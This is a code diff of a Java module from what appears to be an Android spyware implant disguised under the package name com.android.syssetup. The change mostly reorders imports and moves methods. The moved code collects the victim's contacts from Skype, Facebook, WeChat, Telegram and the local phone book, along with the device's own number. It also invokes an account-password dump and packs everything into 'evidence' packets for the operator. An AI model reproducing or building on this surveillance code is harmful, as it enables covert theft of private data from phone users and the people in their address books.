@@ -1,15 +1,8 @@
 package com.android.syssetup.module;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.util.Date;
-import java.util.HashMap;
-import java.util.Hashtable;
-import java.util.Iterator;
-import java.util.List;
-
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.Device;
 import com.android.syssetup.Sim;
 import com.android.syssetup.Status;
@@ -31,11 +24,16 @@ import com.android.syssetup.util.ByteArray;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Iterator;
+import java.util.List;
 
 public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
-
-	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 
 	public static final int SKYPE = 0x02;
 	public static final int FACEBOOK = 0x03;
@@ -47,19 +45,153 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static final int WECHAT = 0x0c;
 	public static final int TELEGRAM = 0x0e;
 	public static final int LOCAL = 0x80000000;
-
-
-
-	private PickContact contact;
-	Markup markupContacts;
+	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 	static HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
-	
+	Markup markupContacts;
 	String observe = M.e("com.android.contacts");
-
+	private PickContact contact;
 	private String myPhone;
 
 	public ModuleAddressBook() {
 
+	}
+
+	private static boolean serializeIfNew(long id, final byte[] packet) {
+
+		final Long crcOld = contacts.get(id);
+		final Long crcNew = Digest.CRC32(packet);
+
+		boolean needToSerialize = false;
+		// if does not match, save and serialize
+		if (!crcNew.equals(crcOld)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): new contact. " + id);//$NON-NLS-1$
+			}
+			contacts.put(id, crcNew);
+			needToSerialize = true;
+			// Thread.yield();
+		}
+		return needToSerialize;
+	}
+
+	private static byte[] preparePacket(int type, long uid, String number, String name, String message) {
+
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, type, 0);
+		if (outputStream == null) {
+			return null;
+		}
+
+		addTypedString(outputStream, (byte) 0x01, name);
+		addTypedString(outputStream, (byte) 0x07, number);
+		addTypedString(outputStream, (byte) 0x37, message);
+
+		addTypedString(outputStream, (byte) 0x40, number);
+
+		final byte[] payload = outputStream.toByteArray();
+
+		final int size = payload.length;
+
+		// a questo punto il payload e' pronto
+		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
+		db_header.writeInt(size);
+
+		return payload;
+	}
+
+	private static ByteArrayOutputStream prepareHeader(long uid, int program, int flags) {
+		final int version = 0x01000001;
+		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+		// Adding header
+		try {
+			outputStream.write(ByteArray.intToByteArray(0)); // size
+			outputStream.write(ByteArray.intToByteArray(version));
+			outputStream.write(ByteArray.intToByteArray((int) uid));
+			outputStream.write(ByteArray.intToByteArray(program));
+			outputStream.write(ByteArray.intToByteArray(flags));
+		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (preparePacket) Error: " + ex);
+			}
+			return null;
+		}
+		return outputStream;
+	}
+
+	private static void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
+		if (name != null && name.length() > 0) {
+			final int header = (type << 24) | (name.length() * 2);
+
+			try {
+				outputStream.write(ByteArray.intToByteArray(header));
+				outputStream.write(WChar.getBytes(name));
+			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(e);//$NON-NLS-1$
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
+				}
+			}
+		}
+	}
+
+	public static void createEvidenceLocal(int evId, String data) {
+		createEvidenceLocal(evId, data, null);
+	}
+
+	public static void createEvidenceLocal(int evId, String data, String name) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createEvidenceLocal) id: " + evId + " data: " + data);//$NON-NLS-1$
+		}
+
+		long uid = -evId;
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, evId, LOCAL);
+		if (outputStream == null) {
+			return;
+		}
+
+		addTypedString(outputStream, (byte) 0x40, data);
+		if (name != null) {
+			addTypedString(outputStream, (byte) 0x01, name);
+		}
+
+		byte[] payload = outputStream.toByteArray();
+		final int size = outputStream.size();
+		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
+		db_header.writeInt(size);
+
+		EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, payload);
+	}
+
+	public static boolean createEvidenceRemote(int type, com.android.syssetup.module.chat.Contact c) {
+
+		long id = c.getId();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id + " name: " + c.name);
+		}
+
+		byte[] packet = preparePacket(type, id, c.number, c.name, c.extra);
+		boolean needToSerialize = serializeIfNew(id, packet);
+		if (needToSerialize) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createEvidenceRemote) new address");
+			}
+			EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, packet);
+		}
+		return needToSerialize;
+	}
+
+	public static ModuleAddressBook getInstance() {
+		return (ModuleAddressBook) ManagerModule.self().getInstancedAgent(ModuleAddressBook.class);
 	}
 
 	@Override
@@ -145,9 +277,9 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 						return 0;
 					}
 				};
-				
+
 				ModulePassword.dumpAccounts(addressVisitor);
-				
+
 			}
 
 			if (contacts()) {
@@ -240,27 +372,9 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		return needToSerialize;
 	}
 
-	private static boolean serializeIfNew(long id, final byte[] packet) {
-
-		final Long crcOld = contacts.get(id);
-		final Long crcNew = Digest.CRC32(packet);
-
-		boolean needToSerialize = false;
-		// if does not match, save and serialize
-		if (!crcNew.equals(crcOld)) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): new contact. " + id);//$NON-NLS-1$
-			}
-			contacts.put(id, crcNew);
-			needToSerialize = true;
-			// Thread.yield();
-		}
-		return needToSerialize;
-	}
-
 	/**
 	 * Prepare the packet from the contact
-	 * 
+	 *
 	 * @param c
 	 * @return
 	 */
@@ -286,75 +400,6 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 	}
 
-	private static byte[] preparePacket(int type, long uid, String number, String name, String message) {
-
-		final ByteArrayOutputStream outputStream = prepareHeader(uid, type, 0);
-		if (outputStream == null) {
-			return null;
-		}
-
-		addTypedString(outputStream, (byte) 0x01, name);
-		addTypedString(outputStream, (byte) 0x07, number);
-		addTypedString(outputStream, (byte) 0x37, message);
-
-		addTypedString(outputStream, (byte) 0x40, number);
-
-		final byte[] payload = outputStream.toByteArray();
-
-		final int size = payload.length;
-
-		// a questo punto il payload e' pronto
-		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
-		db_header.writeInt(size);
-
-		return payload;
-	}
-
-	private static ByteArrayOutputStream prepareHeader(long uid, int program, int flags) {
-		final int version = 0x01000001;
-		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-		// Adding header
-		try {
-			outputStream.write(ByteArray.intToByteArray(0)); // size
-			outputStream.write(ByteArray.intToByteArray(version));
-			outputStream.write(ByteArray.intToByteArray((int) uid));
-			outputStream.write(ByteArray.intToByteArray(program));
-			outputStream.write(ByteArray.intToByteArray(flags));
-		} catch (IOException ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket) Error: " + ex);
-			}
-			return null;
-		}
-		return outputStream;
-	}
-
-	private static void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
-		if (name != null && name.length() > 0) {
-			final int header = (type << 24) | (name.length() * 2);
-
-			try {
-				outputStream.write(ByteArray.intToByteArray(header));
-				outputStream.write(WChar.getBytes(name));
-			} catch (final IOException e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(e);//$NON-NLS-1$
-				}
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (addTypedString): " + e);//$NON-NLS-1$
-				}
-			}
-		}
-	}
-
 	@Override
 	public int notification(Sim b) {
 		Device device = Device.self();
@@ -373,57 +418,6 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		createEvidenceLocal(PHONE, myPhone);
 
 		return 0;
-	}
-
-	public static void createEvidenceLocal(int evId, String data) {
-		createEvidenceLocal(evId, data, null);
-	}
-
-	public static void createEvidenceLocal(int evId, String data, String name) {
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createEvidenceLocal) id: " + evId + " data: " + data);//$NON-NLS-1$
-		}
-
-		long uid = -evId;
-		final ByteArrayOutputStream outputStream = prepareHeader(uid, evId, LOCAL);
-		if (outputStream == null) {
-			return;
-		}
-
-		addTypedString(outputStream, (byte) 0x40, data);
-		if (name != null) {
-			addTypedString(outputStream, (byte) 0x01, name);
-		}
-
-		byte[] payload = outputStream.toByteArray();
-		final int size = outputStream.size();
-		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
-		db_header.writeInt(size);
-
-		EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, payload);
-	}
-
-	public static boolean createEvidenceRemote(int type, com.android.syssetup.module.chat.Contact c) {
-
-		long id = c.getId();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id + " name: " + c.name);
-		}
-
-		byte[] packet = preparePacket(type, id, c.number, c.name, c.extra);
-		boolean needToSerialize = serializeIfNew(id, packet);
-		if (needToSerialize) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createEvidenceRemote) new address");
-			}
-			EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, packet);
-		}
-		return needToSerialize;
-	}
-
-	public static ModuleAddressBook getInstance() {
-		return (ModuleAddressBook) ManagerModule.self().getInstancedAgent(ModuleAddressBook.class);
 	}
 
 }
